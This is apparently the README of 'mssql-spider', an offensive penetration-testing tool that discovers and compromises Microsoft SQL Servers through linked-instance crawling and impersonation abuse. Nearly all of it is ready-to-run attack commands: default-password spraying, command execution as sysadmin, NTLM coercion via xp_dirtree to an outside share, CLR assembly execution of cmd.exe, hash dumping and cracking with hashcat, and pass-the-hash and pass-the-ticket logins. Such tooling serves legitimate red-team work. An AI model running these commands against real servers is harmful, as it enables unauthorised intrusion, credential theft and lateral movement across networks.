# mssql-spider

![Screenshot](./assets/demo.png)

An improved [impacket-mssqclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) that discovers and exploits as many Microsoft SQL Servers as it can reach by crawling linked instances and abusing user impersonation.
For example, it can solve the [OSEP](https://www.offensive-security.com/pen300-osep/) Lab Challenge 2 automatically.

Big thanks to the developers of fortra/impacket#1397, [SQLRecon](https://github.com/xforcered/SQLRecon) and [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) on which this project is based.

# Setup

a) With [pipx](https://github.com/pypa/pipx).

~~~ bash
pipx install git+https://github.com/dadevel/mssql-spider.git@main
~~~

b) With [pip](https://github.com/pypa/pip).

~~~ bash
pip install --user git+https://github.com/dadevel/mssql-spider.git@main
~~~

If you want the latest features replace `@main` with `@dev`.

# Usage

Starting from just network access without credentials (classic network pentest), spray known default passwords, abuse user impersonation or linked instances to reach additional servers and execute `whoami` on all servers where you gained *sysadmin* access:

~~~ bash
mapcidr -cidr 192.168.178.0/24 | mssql-ping | tee ./instances.json | mssql-spray passwords -c ./assets/default-credentials.txt | tee ./logins.json | mssql-spider -x 'whoami /all'
~~~

Starting with domain credentials, fetch SPNs of MSSQL servers from BloodHounds database and coerce NTLM authentication from all reachable servers with `xp_dirtree`.
This does not require privileged access.

~~~ bash
mssql-discover bloodhound | mssql-ping | tee ./instances.json | mssql-spider -d corp.local -u jdoe -p 'passw0rd' --sysinfo -c '\\192.168.178.128\harvest'
~~~

All commands switch to JSON input or output if they are used as part of a pipeline.
You can override this behavior with `--no-json-input` / `--no-json-output`.

## Advanced Features

Load and execute a .NET assembly as *sysadmin*.
The first argument is the path to the DLL.
The second argument is the name of the function to call.
All following arguments are passed to the function as `SqlString`.
The C# code for an exemplary DLL can be found at [SharpProcedure.cs](./extras/SharpProcedure.cs).

~~~ bash
mssql-spider -u sa -p 'passw0rd' -t db01.corp.local --exec-clr ./SharpProcedure.dll Run cmd.exe '/c echo %USERNAME%'
~~~

Dump secrets and crack password hashes of database logins with [hashcat](https://github.com/hashcat/hashcat).

~~~ bash
mssql-spider -u sa -p 'passw0rd' -t db01.corp.local --dump-hashes ./hashes.txt --dump-jobs --dump-autologon
hashcat -O -w 3 -a 0 -m 1731 --username ./hashes.txt ./rockyou.txt
~~~

Post-process the JSON output with `jq`.

~~~ bash
mssql-spider -u sa -p 'passw0rd' -t db01.corp.local -x 'whoami /priv' | jq -r 'select(.pwned==true and .result!=null)'
~~~

## Authentication

As local database user.

~~~ bash
mssql-spider -u jdoe -p 'passw0rd' -t db01.corp.local
~~~

As local windows user.

~~~ bash
mssql-spider -w -u administrator -p 'passw0rd' -t db01.corp.local
~~~

As domain user via NTLM and a password.

~~~ bash
mssql-spider -d corp.local -u jdoe -p 'passw0rd' -t db01.corp.local
~~~

As domain user via NTLM *Pass the Hash*.

~~~ bash
mssql-spider -d corp.local -u jdoe -H b9f917853e3dbf6e6831ecce60725930 -t db01.corp.local
~~~

As domain user via Kerberos *Overpass the Key*.

~~~ bash
mssql-spider -d corp.local -u jdoe -H b9f917853e3dbf6e6831ecce60725930 -k -t db01.corp.local
~~~

As domain user via Kerberos *Pass the Key*.

~~~ bash
mssql-spider -d corp.local -u jdoe -a c4c283276339e2d6b390eb5a11d419c9 -k -t db01.corp.local
~~~

As domain user via Kerberos *Pass the Ticket*.

~~~ bash
export KRB5CCNAME=./jdoe.ccache
mssql-spider -k -t db01.corp.local
~~~

# Library Usage

~~~ python
from mssqlmap.client import Client
from mssqlmap.connection import Connection
from mssqlmap.modules.dump import HashDumper
from mssqlmap.modules.exec import CmdShellExecutor
from mssqlmap.modules.impersonated_user import ImpersonationSpider
from mssqlmap.modules.linked_instance import LinkSpider

with Client(Connection(host='db01.corp.local', username='sa', password='passw0rd')) as client:
    for child, module, status in client.spider([ImpersonationSpider(), LinkSpider()]):
        print(child, module, status)
        if status in ('failed', 'denied', 'repeated'):
            continue
        for module, result in child.invoke([CmdShellExecutor('whoami /all'), HashDumper('./hashes.txt')]):
            print(child, module, result)
~~~

# Prevention and Detection

See [github.com/skahwah/sqlrecon/wiki](https://github.com/xforcered/SQLRecon/wiki/8.-Prevention,-Detection-and-Mitigation-Guidance).
